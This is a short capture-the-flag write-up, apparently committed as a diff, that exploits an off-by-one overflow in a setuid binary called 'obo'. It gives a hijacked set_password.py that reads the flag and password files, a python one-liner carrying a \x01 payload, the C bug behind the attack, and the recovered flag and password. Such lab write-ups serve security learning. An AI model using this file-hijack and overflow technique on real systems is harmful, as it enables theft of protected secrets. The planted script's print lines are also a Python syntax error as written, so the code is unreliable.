@@ -1,0 +1,36 @@
+This was honestly one of the most clever problems that in/s/ane has solved so far.
+
+For this problem, we must create a set_password.py in our current working directory that will print out the contents of /home/obo/flag.txt
+
+In set_password.py:
+
+#!/usr/bin/python
+#import os
+f = open("/home/obo/flag.txt", "r")
+print "FLAG:" f.read()
+f.close()
+f = open("/home/obo/password.txt", "r")
+print "PASSWORD:" f.read()
+f.close()
+
+Afterwards, it's time to exploit /home/obo:
+    python -c 'print "abcdefg0123456789" + "\n\x01\n"' | /home/obo/obo
+
+This command basically makes use of the OBO (Off by one) error introduced by this inexperienced C programmer in the following lines:
+    for (i = 0; i <= strlen(new_password); ++i) {
+        int index = hex_table[(unsigned char) new_password[i]];
+        if (index == -1) {
+            printf("Invalid character: %c\n", new_password[i]);
+            exit(1);
+        }
+        digits[index] = 1;
+    }
+In the line where the index is defined, it searched the hex_table (which also has an OBO error where ':' will give 10, and 'g' or 'G' will give 16. If we put a 'g' in the new_password, then it will make digits[16] = 1. Digits is an array of length 16, so it will overflow into password[64], causing password[0] to be 1 and password[1] to be 0 (NULL). Basically, password is now the number 1 or \x01
+
+So, we pipe the python printout into obo, with \x01 representing the number 1 (NOT '1') into /home/obo/obo, which will pass the check and running the set_password.py command. Since you are in the directory with your modified set_password.py, it will cat the file that you want which is flag.txt
+
+FLAG: watch_your_bounds
+PASSWORD: f9a237e1aa6f004de7c0b5826cca7e32 <-- In case you wanted to know
+
+FOR FUNZ:
+Run /home/obo/obo in the directory with your modified set_password.py and put in f9a237e1aa6f004de7c0b5826cca7e32 for the password. It works the same way as the exploit above! :)
